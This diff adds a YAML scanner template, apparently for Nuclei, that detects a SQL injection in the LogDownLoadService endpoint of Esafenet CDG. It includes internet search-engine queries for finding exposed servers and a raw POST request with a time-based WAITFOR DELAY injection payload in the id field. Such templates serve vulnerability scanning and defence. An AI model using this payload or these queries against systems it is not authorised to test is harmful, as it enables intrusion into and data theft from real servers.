@@ -1,0 +1,36 @@
+id: Esafenet_CDG_LogDownLoadService_SQLi
+
+info:
+  name: Esafenet_CDG_LogDownLoadService_SQLi
+  author: HK
+  severity: high
+  description: 亿赛通电子文档安全管理系统LogDownLoadService存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="/CDGServer3/index.jsp"
+    Quake-query: body="/CDGServer3/index.jsp"
+    Hunter-query: body="/CDGServer3/index.jsp"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /CDGServer3/logManagement/LogDownLoadService HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    X-Requested-With: XMLHttpRequest
+    Content-Length: 120
+
+    command=downLoadLogFiles&currPage=1&fromurl=../user/dataSearch.jsp&logFileName=indsex.txt&id=-1';WAITFOR DELAY '0:0:4'--
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
